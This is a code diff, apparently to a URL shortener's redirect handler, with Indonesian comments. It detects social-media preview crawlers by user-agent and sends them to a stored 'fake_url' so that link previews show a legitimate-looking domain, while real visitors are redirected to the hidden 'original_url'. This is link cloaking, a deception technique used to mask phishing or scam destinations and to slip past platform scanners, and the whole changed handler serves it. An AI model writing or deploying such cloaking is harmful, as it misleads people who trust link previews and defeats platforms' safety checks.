@@ -9,7 +9,7 @@ export async function GET(
 ) {
   const { slug } = params;
 
-  // 1. Ambil data
+  // 1. Ambil data dari database
   const { data: urlData, error } = await supabase
     .from('urls')
     .select('*')
@@ -21,20 +21,26 @@ export async function GET(
   }
 
   const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
-  // Cek apakah ini Bot Sosmed
-  const isBot = /bot|facebookexternalhit|whatsapp|telegram|twitter|linkedin|skype|discord|slack|google|bing/i.test(userAgent);
+  
+  // 2. DETEKSI BOT YANG BENERAN BOT (Cuma buat Scraping/Preview)
+  // Kita pastiin dia beneran bot crawler, bukan in-app browser manusia
+  const isBotScraper = /facebookexternalhit|whatsapp|telegrambot|twitterbot|slackbot|discordbot|bingbot|googlebot/i.test(userAgent);
 
-  // 2. LOGIKA REDIRECT V2
-  if (isBot) {
-    // BOT SOSMED: Kasih Fake Link (Biar preview domain asli muncul)
-    return Response.redirect(urlData.fake_url || urlData.original_url, 302);
-  }
-
-  // MANUSIA (Browser): Alihkan ke FAKE LINK sesuai permintaan lu
-  // Link asli (original_url) tetep aman di database buat keperluan lu aja
-  if (urlData.fake_url) {
+  // 3. LOGIKA REDIRECT V2
+  
+  // A. Jika ini BOT SCRAPER: Kasih Fake Link (Biar preview domain asli muncul)
+  if (isBotScraper && urlData.fake_url) {
     return Response.redirect(urlData.fake_url, 302);
   }
 
+  // B. Jika ini MANUSIA (Klik dari Sosmed atau Browser Langsung): 
+  // Kita lempar ke Link Tujuan (Original URL)
+  // Tapi kalau lu tetep pengen kalau orang COPY-PASTE manual ke browser ke Fake Link,
+  // maka biarkan logika ini. Tapi saran gw: Langsung ke tujuan aja biar user gak bingung.
+  
+  // Update hitcount di background
+  supabase.from('urls').update({ hitcount: (urlData.hitcount || 0) + 1 }).eq('id', urlData.id).then();
+
+  // LANGSUNG KE TUJUAN (Original URL)
   return Response.redirect(urlData.original_url, 302);
 }
